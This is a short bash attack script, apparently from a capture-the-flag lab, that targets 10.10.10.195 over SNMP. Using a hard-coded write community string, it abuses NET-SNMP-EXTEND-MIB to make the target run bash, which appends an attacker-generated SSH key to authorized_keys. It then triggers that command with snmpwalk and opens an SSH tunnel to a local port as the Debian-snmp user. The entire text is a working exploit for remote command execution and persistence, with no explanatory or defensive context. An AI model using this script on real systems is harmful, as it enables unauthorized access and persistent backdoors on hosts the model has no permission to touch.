#!/bin/bash

ssh-keygen -b 2048 -t ed25519 -f ./key -q -N ""
key=$(cat key.pub)
shitvalue="lkabeahbf"
snmpset -m +NET-SNMP-EXTEND-MIB -v 2c -c SuP3RPrivCom90 10.10.10.195 \
    "nsExtendStatus.\"${shitvalue}\""  = createAndGo \
    "nsExtendCommand.\"${shitvalue}\"" = /bin/bash \
    "nsExtendArgs.\"${shitvalue}\""    = "-c \"echo ${key} >> ~/.ssh/authorized_keys\""
snmpwalk -v 2c -c SuP3RPrivCom90 10.10.10.195 1.3.6.1.4.1.8072.1.3.2
ssh -N -L 5001:127.0.0.1:5001 Debian-snmp@10.10.10.195 -i key
